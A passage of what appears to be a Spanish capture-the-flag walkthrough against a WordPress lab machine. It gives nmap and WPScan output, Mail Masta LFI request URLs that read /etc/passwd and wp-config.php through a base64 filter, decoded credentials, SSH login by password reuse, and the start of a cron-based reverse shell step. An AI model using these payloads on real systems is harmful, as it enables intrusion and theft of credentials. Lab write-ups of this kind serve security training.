# Ruta de explotación

## Escaneo Nmap de Puertos y Servicios

Escaneo completo de todos los puertos con detección de versiones, sistema operativo y scripts predeterminados. Se descubren dos puertos abiertos: el puerto 22/tcp ejecutando OpenSSH 8.9p1 para acceso remoto seguro, y el puerto 7664/tcp alojando un servidor web lighttpd 1.4.63 con un sitio WordPress 7.0.1 titulado "Fritz Haber – La Enciclopedia Libre". 

```bash
sudo nmap -p- -sV -O -sC -v IP

──(kali㉿kali)-[~]
└─$ sudo nmap -p- -sV -O -sC -v 192.168.184.140
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 10:08 +0200
Scanning 192.168.184.140 [65535 ports]
Discovered open port 22/tcp on 192.168.184.140
Discovered open port 7664/tcp on 192.168.184.140
Completed SYN Stealth Scan at 10:08, 6.32s elapsed (65535 total ports)
Initiating Service scan at 10:08
Scanning 2 services on 192.168.184.140
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 74:2b:e3:70:6f:ad:35:e7:91:f7:66:28:32:29:ce:7d (ECDSA)
|_  256 1e:4e:bd:99:bf:15:ed:9d:ec:f6:0f:84:9d:95:29:b0 (ED25519)
7664/tcp open  http    lighttpd 1.4.63
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 7.0.1
|_http-server-header: lighttpd/1.4.63
|_http-title: Fritz Haber &#8211; La Enciclopedia Libre
MAC Address: 00:0C:29:54:A8:C3 (VMware)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Uptime guess: 21.826 days (since Tue Jun 23 14:19:18 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Escaneo WPScan de WordPress

Escaneo de seguridad del sitio WordPress alojado en el puerto 7664, identificando la versión 7.0.1 del CMS con el tema twentytwentyfive. Se detectan endpoints sensibles como XML-RPC habilitado, readme.html y wp-cron.php accesibles. El plugin Akismet 5.7 se encuentra instalado, pero lo más relevante es el plugin Mail Masta 1.0, ubicado en /wp-content/plugins/mail-masta/, el cual presenta un historial de vulnerabilidades conocidas que podrían ser explotadas para obtener acceso al sistema.

```bash
wpscan --url http://IP:7664 -e ap --plugins-detection aggressive

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.103:7664/ [192.168.1.103]
[+] Started: Tue Jul 14 09:49:26 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: lighttpd/1.4.63
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.103:7664/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.1.103:7664/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.1.103:7664/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 7.0.1 identified (Latest, released on 2026-07-09).
 | Found By: Meta Generator (Passive Detection)
 |  - http://192.168.1.103:7664/, Match: 'WordPress 7.0.1'
 | Confirmed By: Atom Generator (Aggressive Detection)
 |  - http://192.168.1.103:7664/?feed=atom, <generator uri="https://wordpress.org/" version="7.0.1">WordPress</generator>

[+] WordPress theme in use: twentytwentyfive
 | Location: http://192.168.1.103:7664/wp-content/themes/twentytwentyfive/
 | Latest Version: 1.5 (up to date)
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://192.168.1.103:7664/wp-content/themes/twentytwentyfive/readme.txt
 | Style URL: http://192.168.1.103:7664/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.103:7664/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:09 <=============================================> (125059 / 125059) 100.00% Time: 00:02:09
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.1.103:7664/wp-content/plugins/akismet/
 | Latest Version: 5.7 (up to date)
 | Last Updated: 2026-04-23T22:34:00.000Z
 | Readme: http://192.168.1.103:7664/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.103:7664/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.7 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.1.103:7664/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.1.103:7664/wp-content/plugins/akismet/readme.txt

[+] mail-masta
 | Location: http://192.168.1.103:7664/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 | Readme: http://192.168.1.103:7664/wp-content/plugins/mail-masta/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.103:7664/wp-content/plugins/mail-masta/, status: 403
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.1.103:7664/wp-content/plugins/mail-masta/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jul 14 09:52:21 2026
[+] Requests Done: 125070
[+] Cached Requests: 42
[+] Data Sent: 34.931 MB
[+] Data Received: 16.001 MB
[+] Memory used: 458.059 MB
[+] Elapsed time: 00:02:55
```

## Explotación de LFI en Mail Masta y Enumeración de Configuración

Explotación de la vulnerabilidad CVE-2016-10956 en el plugin Mail Masta mediante un Local File Inclusion (LFI) en el archivo /inc/campaign/count_of_send.php con el parámetro pl. 

### Enumeración de Usuarios del Sistema

Lectura del archivo /etc/passwd mediante el LFI del plugin Mail Masta, confirmando la existencia de los usuarios haber_fritz (UID 1000) y clara_immerwahr en el sistema, junto con otros usuarios del sistema como root, mysql y www-data, proporcionando información valiosa para posteriores vectores de ataque y escalada de privilegios.

```bash
http://IP:7664/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false syslog:x:106:113::/home/syslog:/usr/sbin/nologin uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin haber_fritz:x:1000:1000:Fritz Haber:/home/haber_fritz:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false clara_immerwahr:x:1001:1001:Clara Immerwahr,,,:/home/clara_immerwahr:/bin/bash 
```
### Exfiltración de wp-config.php mediante LFI

Lectura del archivo de configuración de WordPress mediante filtro base64 para evadir la ejecución del código PHP, decodificando posteriormente el contenido para obtener las credenciales de la base de datos, incluyendo el usuario wp_user y la contraseña 9/12/!1868_Br3sl$a5ia!, que coinciden con las credenciales del usuario haber_fritz del sistema.

```bash
http://IP:7664/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
```

```bash
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUgaW5zdGFsbGF0aW9uLg0KICogWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWJzaXRlLCB5b3UgY2FuIGNvcHkgdGhpcyBmaWxlIHRvICJ3cC1jb25maWcucGhwIg0KICogYW5kIGZpbGwgaW4gdGhlIHZhbHVlcy4NCiAqDQogKiBUaGlzIGZpbGUgY29udGFpbnMgdGhlIGZvbGxvd2luZyBjb25maWd1cmF0aW9uczoNCiAqDQogKiAqIERhdGFiYXNlIHNldHRpbmdzDQogKiAqIFNlY3JldCBrZXlzDQogKiAqIERhdGFiYXNlIHRhYmxlIHByZWZpeA0KICogKiBBQlNQQVRIDQogKg0KICogQGxpbmsgaHR0cHM6Ly9kZXZlbG9wZXIud29yZHByZXNzLm9yZy9hZHZhbmNlZC1hZG1pbmlzdHJhdGlvbi93b3JkcHJlc3Mvd3AtY29uZmlnLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIERhdGFiYXNlIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIERhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ3dwX3VzZXInICk7DQoNCi8qKiBEYXRhYmFzZSBwYXNzd29yZCAqLw0KZGVmaW5lKCAnREJfUEFTU1dPUkQnLCAnOS8xMi8hMTg2OF9CcjNzbCRhNWlhIScgKTsNCg0KLyoqIERhdGFiYXNlIGhvc3RuYW1lICovDQpkZWZpbmUoICdEQl9IT1NUJywgJ2xvY2FsaG9zdCcgKTsNCg0KLyoqIERhdGFiYXNlIGNoYXJzZXQgdG8gdXNlIGluIGNyZWF0aW5nIGRhdGFiYXNlIHRhYmxlcy4gKi8NCmRlZmluZSggJ0RCX0NIQVJTRVQnLCAndXRmOG1iNCcgKTsNCg0KLyoqIFRoZSBkYXRhYmFzZSBjb2xsYXRlIHR5cGUuIERvbid0IGNoYW5nZSB0aGlzIGlmIGluIGRvdWJ0LiAqLw0KZGVmaW5lKCAnREJfQ09MTEFURScsICcnICk7DQoNCi8qKiNAKw0KICogQXV0aGVudGljYXRpb24gdW5pcXVlIGtleXMgYW5kIHNhbHRzLg0KICoNCiAqIENoYW5nZSB0aGVzZSB0byBkaWZmZXJlbnQgdW5pcXVlIHBocmFzZXMhIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcNCiAqIHRoZSB7QGxpbmsgaHR0cHM6Ly9hcGkud29yZHByZXNzLm9yZy9zZWNyZXQta2V5LzEuMS9zYWx0LyBXb3JkUHJlc3Mub3JnIHNlY3JldC1rZXkgc2VydmljZX0uDQogKg0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4NCiAqIFRoaXMgd2lsbCBmb3JjZSBhbGwgdXNlcnMgdG8gaGF2ZSB0byBsb2cgaW4gYWdhaW4uDQogKg0KICogQHNpbmNlIDIuNi4wDQogKi8NCmRlZmluZSggJ0FVVEhfS0VZJywgICAgICAgICAnbWdwLkdYNkxEQVMqTSRjNzZnfSs+RVt1OVIjRkN1cStXfHZGZE4+T15zeDNnU0pvPl19PV1+TyhCRGI3KldBYCcgKTsNCmRlZmluZSggJ1NFQ1VSRV9BVVRIX0tFWScsICAnS1QqVjNUbX4uekg+PlB+WUpmbFEwMXg6fWNEJmtRQj9pM1pWak5zMWZDRlV9dHc1PUMqXkh4LjUyYkNeMkAyVycgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9LRVknLCAgICAnIFlFLGg/NFA4angwWFB3Y19KW090VXMsMU5BN2xMQDlHYnJPe3p4T2t5XkdkVFVZWyBSP0FMViBJZGFCSDRZKicgKTsNCmRlZmluZSggJ05PTkNFX0tFWScsICAgICAgICAnM0FLYWQqYn50dmpPcGZGekZqUjs9PHxGNSxFdllHZ3xualB3ezBheS0ya2NLeS5SSGZ7Snp+PkR8TjJ+YkcxNycgKTsNCmRlZmluZSggJ0FVVEhfU0FMVCcsICAgICAgICAnO0h+dDYlNnpdLGtCdWBXNUxkZFsmXjlwKUVNLjEveGtZdk08I2VmPlJAQyFZayBGOXJ3NH47SXRhQUQuVE1tcycgKTsNCmRlZmluZSggJ1NFQ1VSRV9BVVRIX1NBTFQnLCAnQVRGI15vKy0wcmNLXk5pTCtefE81YjFOYTlmflZyM1VFcj0mU2g4dmpBfk1fZ0pvcjhVKVBzN01OM0BePmVtWicgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9TQUxUJywgICAnRUZKLip0cyFKd0lYezd0ZEwpRnwtMk5WWnUtQzpaeXYjajxhZnlzbjFZPyZ+PGE+YS8lXjpyO1JETyxxekRxIScgKTsNCmRlZmluZSggJ05PTkNFX1NBTFQnLCAgICAgICAnRnN2ZyolTjw2Wig4P0hnU3ZjLFV+S1JRZVNdJV8kOGpvS1c0VT56WC45TWhLeTgqMW10K1pzX3MgSXl5PG8lTScgKTsNCg0KLyoqI0AtKi8NCg0KLyoqDQogKiBXb3JkUHJlc3MgZGF0YWJhc2UgdGFibGUgcHJlZml4Lg0KICoNCiAqIFlvdSBjYW4gaGF2ZSBtdWx0aXBsZSBpbnN0YWxsYXRpb25zIGluIG9uZSBkYXRhYmFzZSBpZiB5b3UgZ2l2ZSBlYWNoDQogKiBhIHVuaXF1ZSBwcmVmaXguIE9ubHkgbnVtYmVycywgbGV0dGVycywgYW5kIHVuZGVyc2NvcmVzIHBsZWFzZSENCiAqDQogKiBBdCB0aGUgaW5zdGFsbGF0aW9uIHRpbWUsIGRhdGFiYXNlIHRhYmxlcyBhcmUgY3JlYXRlZCB3aXRoIHRoZSBzcGVjaWZpZWQgcHJlZml4Lg0KICogQ2hhbmdpbmcgdGhpcyB2YWx1ZSBhZnRlciBXb3JkUHJlc3MgaXMgaW5zdGFsbGVkIHdpbGwgbWFrZSB5b3VyIHNpdGUgdGhpbmsNCiAqIGl0IGhhcyBub3QgYmVlbiBpbnN0YWxsZWQuDQogKg0KICogQGxpbmsgaHR0cHM6Ly9kZXZlbG9wZXIud29yZHByZXNzLm9yZy9hZHZhbmNlZC1hZG1pbmlzdHJhdGlvbi93b3JkcHJlc3Mvd3AtY29uZmlnLyN0YWJsZS1wcmVmaXgNCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKg0KICogQ2hhbmdlIHRoaXMgdG8gdHJ1ZSB0byBlbmFibGUgdGhlIGRpc3BsYXkgb2Ygbm90aWNlcyBkdXJpbmcgZGV2ZWxvcG1lbnQuDQogKiBJdCBpcyBzdHJvbmdseSByZWNvbW1lbmRlZCB0aGF0IHBsdWdpbiBhbmQgdGhlbWUgZGV2ZWxvcGVycyB1c2UgV1BfREVCVUcNCiAqIGluIHRoZWlyIGRldmVsb3BtZW50IGVudmlyb25tZW50cy4NCiAqDQogKiBGb3IgaW5mb3JtYXRpb24gb24gb3RoZXIgY29uc3RhbnRzIHRoYXQgY2FuIGJlIHVzZWQgZm9yIGRlYnVnZ2luZywNCiAqIHZpc2l0IHRoZSBkb2N1bWVudGF0aW9uLg0KICoNCiAqIEBsaW5rIGh0dHBzOi8vZGV2ZWxvcGVyLndvcmRwcmVzcy5vcmcvYWR2YW5jZWQtYWRtaW5pc3RyYXRpb24vZGVidWcvZGVidWctd29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoNCi8qIEFkZCBhbnkgY3VzdG9tIHZhbHVlcyBiZXR3ZWVuIHRoaXMgbGluZSBhbmQgdGhlICJzdG9wIGVkaXRpbmciIGxpbmUuICovDQoNCg0KDQovKiBUaGF0J3MgYWxsLCBzdG9wIGVkaXRpbmchIEhhcHB5IHB1Ymxpc2hpbmcuICovDQoNCi8qKiBBYnNvbHV0ZSBwYXRoIHRvIHRoZSBXb3JkUHJlc3MgZGlyZWN0b3J5LiAqLw0KaWYgKCAhIGRlZmluZWQoICdBQlNQQVRIJyApICkgew0KCWRlZmluZSggJ0FCU1BBVEgnLCBfX0RJUl9fIC4gJy8nICk7DQp9DQoNCi8qKiBTZXRzIHVwIFdvcmRQcmVzcyB2YXJzIGFuZCBpbmNsdWRlZCBmaWxlcy4gKi8NCnJlcXVpcmVfb25jZSBBQlNQQVRIIC4gJ3dwLXNldHRpbmdzLnBocCc7DQo=
```
### Decodificación de wp-config.php

Contenido completo del archivo wp-config.php decodificado desde base64, revelando las credenciales de la base de datos wp_user:9/12/!1868_Br3sl$a5ia! y las claves de autenticación de WordPress. Esta información confirma que la contraseña es la misma que la del usuario haber_fritz, permitiendo posible reutilización de credenciales para acceso SSH al sistema.

```bash
echo "PD9waHANCi8qKg0KICogVGhlIGJhc...." | base64 -d
```

```bash
 | base64 -d
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', '9/12/!1868_Br3sl$a5ia!' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'mgp.GX6LDAS*M$c76g}+>E[u9R#FCuq+W|vFdN>O^sx3gSJo>]}=]~O(BDb7*WA`' );
define( 'SECURE_AUTH_KEY',  'KT*V3Tm~.zH>>P~YJflQ01x:}cD&kQB?i3ZVjNs1fCFU}tw5=C*^Hx.52bC^2@2W' );
define( 'LOGGED_IN_KEY',    ' YE,h?4P8jx0XPwc_J[OtUs,1NA7lL@9GbrO{zxOky^GdTUY[ R?ALV IdaBH4Y*' );
define( 'NONCE_KEY',        '3AKad*b~tvjOpfFzFjR;=<|F5,EvYGg|njPw{0ay-2kcKy.RHf{Jz~>D|N2~bG17' );
define( 'AUTH_SALT',        ';H~t6%6z],kBu`W5Ldd[&^9p)EM.1/xkYvM<#ef>R@C!Yk F9rw4~;ItaAD.TMms' );
define( 'SECURE_AUTH_SALT', 'ATF#^o+-0rcK^NiL+^|O5b1Na9f~Vr3UEr=&Sh8vjA~M_gJor8U)Ps7MN3@^>emZ' );
define( 'LOGGED_IN_SALT',   'EFJ.*ts!JwIX{7tdL)F|-2NVZu-C:Zyv#j<afysn1Y?&~<a>a/%^:r;RDO,qzDq!' );
define( 'NONCE_SALT',       'Fsvg*%N<6Z(8?HgSvc,U~KRQeS]%_$8joKW4U>zX.9MhKy8*1mt+Zs_s Iyy<o%M' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 *
 * At the installation time, database tables are created with the specified prefix.
 * Changing this value after WordPress is installed will make your site think
 * it has not been installed.
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```
## Acceso SSH con Credenciales Reutilizadas

Conexión al sistema a través de SSH utilizando las credenciales del usuario haber_fritz, ya que la contraseña obtenida de wp-config.php coincide con la del usuario del sistema, esto lo sabemos gracias a la pista de la página web de Haber Fritz. Esto permite obtener acceso inicial a la máquina vulnerable mediante el puerto 22, aprovechando la mala práctica de reutilizar contraseñas entre la base de datos WordPress y el usuario del sistema operativo.

![](Evidencias_Visuales/pistacredenciales)

---
---

### FLAG #1: Fritz Haber

Reconocimiento de los directorios: 
```bash
haber_fritz@ammonia:~$ ls -la
total 64
drwxr-x--- 7 haber_fritz haber_fritz 4096 Jul 16 08:05 .
drwxr-xr-x 4 root        root        4096 Jul 14 14:22 ..
-rw-rw-r-- 1 haber_fritz haber_fritz   44 Jul 16 07:57 agricultura_1918.txt
-rw------- 1 haber_fritz haber_fritz 1417 Jul 15 11:45 .bash_history
-rw-r--r-- 1 haber_fritz haber_fritz  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 haber_fritz haber_fritz 3771 Jan  6  2022 .bashrc
drwx------ 3 haber_fritz haber_fritz 4096 Jul 16 08:05 .cache
-rw-rw-r-- 1 haber_fritz haber_fritz   27 Jul 16 08:01 config_server.txt
drwxrwxr-x 3 haber_fritz haber_fritz 4096 Jul 16 08:01 documentos
-rw-rw-r-- 1 haber_fritz haber_fritz   17 Jul 16 08:01 lista_compras.txt
drwx------ 3 haber_fritz haber_fritz 4096 Jul 14 14:46 .local
-rw------- 1 haber_fritz haber_fritz   13 Jul 14 10:20 .mysql_history
-rw-rw-r-- 1 haber_fritz haber_fritz   17 Jul 16 08:01 notas_personales.txt
-rw-r--r-- 1 haber_fritz haber_fritz  807 Jan  6  2022 .profile
drwxrwxr-x 3 haber_fritz haber_fritz 4096 Jul 16 08:05 .secret
drwx------ 2 haber_fritz haber_fritz 4096 Jul 14 08:57 .ssh
-rw-r--r-- 1 haber_fritz haber_fritz    0 Jul 14 09:59 .sudo_as_admin_successful
```
```bash
haber_fritz@ammonia:~$ ls -la .secret/
total 20
drwxrwxr-x 3 haber_fritz haber_fritz 4096 Jul 16 08:05 .
drwxr-x--- 7 haber_fritz haber_fritz 4096 Jul 16 08:05 ..
-rw-rw-r-- 1 haber_fritz haber_fritz   41 Jul 16 07:57 amoniaco_sintesis.txt
drwxrwxr-x 5 haber_fritz haber_fritz 4096 Jul 16 08:11 backup
-rw-rw-r-- 1 haber_fritz haber_fritz   26 Jul 16 08:05 user_config.txt
```
Encontramos un .zip, en donde la contraseña para abrirlo se encuentra en la página, ya que tiene exactamente el mismo nombre que el zip.
```bash
haber_fritz@ammonia:~/.secret/backup$ ls -la
total 36
drwxrwxr-x 5 haber_fritz haber_fritz 4096 Jul 16 08:27  .
drwxrwxr-x 3 haber_fritz haber_fritz 4096 Jul 16 08:05  ..
-rw-rw-r-- 1 haber_fritz haber_fritz   53 Jul 16 08:10  backup_log.txt
drwxrwxr-x 2 haber_fritz haber_fritz 4096 Jul 16 08:11  config
drwxrwxr-x 2 haber_fritz haber_fritz 4096 Jul 16 08:11  data
-rw-rw-r-- 1 haber_fritz haber_fritz   19 Jul 16 08:10  error_report.log
drwxrwxr-x 2 haber_fritz haber_fritz 4096 Jul 16 08:11  logs
-rw-rw-r-- 1 haber_fritz haber_fritz 1445 Jul 16 08:08 'Proceso Haber-Bosch para la producción de amoníaco.zip'
-rw-rw-r-- 1 haber_fritz haber_fritz   26 Jul 16 08:10  system_config.txt
```
Podemos ver el contenido del zip:
```bash
unzip -l 'Proceso Haber-Bosch para la producción de amoníaco.zip'

Archive:  Proceso Haber-Bosch para la producción de amoníaco.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       92  2026-07-16 07:57   proceso_haber_bosch.txt
       54  2026-07-16 07:57   proceso_haber.txt
       44  2026-07-16 07:57   agricultura_1918.txt
       30  2026-07-16 08:08   guerra_quimica.txt
       41  2026-07-16 07:57   amoniaco_sintesis.txt
       38  2026-07-16 07:57   nobel_1918.txt
---------                     -------
      299                     6 files
```
Volvemos a la página web y al inspeccionar la página observamos una fórmula extraña. 

![](Evidencias_Visuales/inspeccionbosch)

en donde la pista se encuentra en la sección "No usar para la reacción"

![](Evidencias_Visuales/paginahaber)

Aquí vemos que el texto ha sido cifrado mediante ROT8000, ((R))enio, ((O))smio , ((T))antalio , Octaoxígeno ((8)) , Neutronio ((0)) , Neutronio ((0)) , Neutronio ((0)), lo desciframos en cyberchef y nos da la clave para el .zip

𝑁簱𝑔簲簴簼𝐻 簱𝑔簲鶣簻𝑁𝐻簱𝑔簲 罻𝐻粗籆鷩簽簿簵簻 𝑘𝑗簸𝑚𝑜𝑙 = 𝑁(𝑔)+3𝐻 (𝑔)⇌2𝑁𝐻(𝑔) Δ𝐻°=−46,2 𝑘𝑗/𝑚𝑜𝑙

Y descomprimimos el archivo:

```bash
unzip 'Proceso Haber-Bosch para la producción de amoníaco.zip'
```

En donde la flag se encontraría en proceso_haber_bosch.txt:
```bash
fl4gyflag{empieza la primera guerra mundial, enviar de inmediato todo a guerra_quimica.txt}
```

Y aqui tenemos otra pista para continuar, hay que ver el archivo guerra_quimica.txt en donde nos dice: ver de inmediato /etc/crontab, por lo que procedemos a la segunda parte de la busqueda:

---
---
## Escalada a Clara mediante Cron Mal Configurado

Ya que tenemos la pista de ver /etc/crontab, tenemos que lograr la obtención de acceso al usuario clara_immerwahr explotando la tarea cron que ejecuta el script /opt/scripts/backup_notes.sh con sus privilegios cada minuto. Al tener permisos de escritura en el script (777), se inyecta una reverse shell que se conecta al puerto 9001 de la máquina atacante, obteniendo así una shell interactiva con los permisos de clara_immerwahr cuando el cron ejecute el script modificado.

Tras obtener acceso como haber_fritz, enumeramos las tareas cron del sistema revisando el archivo /etc/crontab.
